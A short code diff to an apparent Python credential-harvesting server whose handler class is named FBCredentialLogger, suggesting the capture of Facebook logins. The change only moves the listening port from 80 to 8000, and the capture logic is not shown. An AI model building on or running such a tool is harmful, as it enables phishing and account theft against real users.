@@ -33,5 +33,5 @@ class FBCredentialLogger(http.server.BaseHTTPRequestHandler):
 
 
 print("[log] starting credential logging server")
-httpd = http.server.HTTPServer(("", 80), FBCredentialLogger)
+httpd = http.server.HTTPServer(("", 8000), FBCredentialLogger)
 httpd.serve_forever()
